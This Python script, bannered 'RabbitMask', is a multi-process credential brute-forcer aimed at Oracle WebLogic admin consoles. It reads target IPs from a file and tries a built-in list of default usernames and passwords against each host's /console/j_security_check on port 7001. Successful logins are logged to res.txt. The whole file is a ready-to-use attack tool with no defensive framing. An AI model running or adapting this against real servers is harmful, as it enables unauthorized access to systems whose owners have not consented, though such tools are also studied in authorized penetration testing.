#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
     ____       _     _     _ _   __  __           _
   |  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
  | |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
 |  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import requests
import logging
from multiprocessing import Pool, Manager


logging.basicConfig(filename='weblogicpwdd.log', level=logging.INFO)

headers = {'user-agent': 'ceshi/0.0.1'}

filename = 'ip.txt'
resname = 'res.txt'

userdict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe',
                'wlcsystem', 'wlpisystem']

pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe',
               'wlcsystem', 'wlpisystem']


def weakPasswd(ip,q):
    print('[*] Target Weblogic: ' + ip + ' started... ...')
    logging.info('[*] Target Weblogic: ' + ip + ' started... ...')
    try:
        for user in userdict:
            for pwd in pwddict:
                data = {
                    'j_username': user,
                    'j_password': pwd,
                    'j_character_encoding': 'UTF-8',
                }
                req = requests.post('http://' + str(ip) + ':7001/console/j_security_check', data=data,
                                    allow_redirects=False,
                                    verify=False)
                # logging.info('[*] ip: ' + ip + '  username: ' + user + '  password: ' + pwd)

                if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                    logging.info('[+] Congratulations! Target Weblogic: ' + ip + ' username: ' + user + '  password: ' + pwd)
                    print('[+] Congratulations! Target Weblogic: ' + ip + ' username: ' + user + '  password: ' + pwd)
                    fw = open(resname, 'a')
                    fw.write('[+] Congratulations! Target Weblogic: ' + ip + ' username: ' + user + '  password: ' + pwd + '\n')
                    fw.close()
                    break
        print('[*] Target Weblogic: ' + ip + ' finished... ...')
        logging.info('[*] Target Weblogic: ' + ip + ' finished... ...')
    except:
        print('[*] Target Weblogic: ' + ip + ' finished... ...')
        logging.warning('[*] Target Weblogic: ' + ip + ' finished... ...')
    q.put()


def run():
    p = Pool(10)
    q = Manager().Queue()
    fr = open(filename, 'r')
    ips = fr.readlines()
    fr.close()
    for i in range(len(ips)):
        ip=ips[i]
        ip=ip.replace("\n",'')
        p.apply_async(weakPasswd,args=(ip,q,))
    p.close()
    p.join()
    print('>>>>>任务结束\n')


if __name__ == '__main__':
    run()
